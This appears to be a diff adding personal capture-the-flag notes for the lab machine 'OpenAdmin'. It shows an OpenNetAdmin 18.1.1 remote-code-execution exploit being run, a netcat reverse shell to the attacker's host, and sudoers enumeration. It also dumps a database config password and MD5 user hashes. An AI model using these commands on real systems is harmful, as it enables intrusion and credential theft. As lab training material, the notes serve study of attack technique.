@@ -1,0 +1,129 @@
+
+
+http://10.10.10.171/ona/
+OpenNetAdmin - v18.1.1
+
+https://github.com/amriunix/ona-rce?tab=readme-ov-file
+
+┌──(ed㉿kali)-[~/Downloads]
+└─$ python3 ona-rce.py check http://10.10.10.171/ona
+[*] OpenNetAdmin 18.1.1 - Remote Code Execution
+[+] Connecting !
+[+] The remote host is vulnerable!
+                                                                                                    
+┌──(ed㉿kali)-[~/Downloads]
+└─$ python3 ona-rce.py exploit http://10.10.10.171/ona
+[*] OpenNetAdmin 18.1.1 - Remote Code Execution
+[+] Connecting !
+[+] Connected Successfully!
+sh$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+sh$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+
+sh$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.8 8821 >/tmp/f
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.10.171] 33990
+bash: cannot set terminal process group (1303): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@openadmin:/opt/ona/www$ 
+
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
+Sudoers file: /etc/sudoers.d/joanna is readable
+joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
+
+www-data@openadmin:/var/www/html/marga/.git/logs/refs/heads$ cat master
+cat master
+0000000000000000000000000000000000000000 b3da11277056daf443bbedbae55b0c24c8814fb9 Joefrey Mahusay <joefrey.mahusay@gmail.com> 1569842516 +0800	commit (initial): Inital commit for marga
+b3da11277056daf443bbedbae55b0c24c8814fb9 4b95305c9f0b1e161b990739a22ad44b3ea860da Joefrey Mahusay <joefrey.mahusay@gmail.com> 1569842598 +0800	commit: Add google adsense and analytics
+4b95305c9f0b1e161b990739a22ad44b3ea860da 71c103b885ccb96a13fcb6bc032e72964cc4e21f Joefrey Mahusay <joefrey.mahusay@gmail.com> 1569842703 +0800	commit: Add favicon
+
+www-data@openadmin:/var/www/html/ona/local/config$ cat database_settings.inc.php
+<tml/ona/local/config$ cat database_settings.inc.php
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p
+mysql -u ona_sys -p
+Enter password: n1nj4W4rri0R!
+use ona_default
+show tables;
+select *;
+ERROR 1096 (HY000) at line 3: No tables used
+Tables_in_ona_default
+blocks
+configuration_types
+configurations
+custom_attribute_types
+custom_attributes
+dcm_module_list
+device_types
+devices
+dhcp_failover_groups
+dhcp_option_entries
+dhcp_options
+dhcp_pools
+dhcp_server_subnets
+dns
+dns_server_domains
+dns_views
+domains
+group_assignments
+groups
+host_roles
+hosts
+interface_clusters
+interfaces
+locations
+manufacturers
+messages
+models
+ona_logs
+permission_assignments
+permissions
+roles
+sequences
+sessions
+subnet_types
+subnets
+sys_config
+tags
+users
+vlan_campuses
+vlans
+
+select * from users;
+use users;
+ERROR 1044 (42000) at line 3: Access denied for user 'ona_sys'@'localhost' to database 'users'
+id	username	password	level	ctime	atime
+1	guest	098f6bcd4621d373cade4e832627b4f6	0	2025-10-28 08:51:39	2025-10-28 08:51:39
+2	admin	21232f297a57a5a743894a0e4a801fc3	0	2007-10-30 03:00:17	2007-12-02 22:10:26
+
+admin //passwd
+
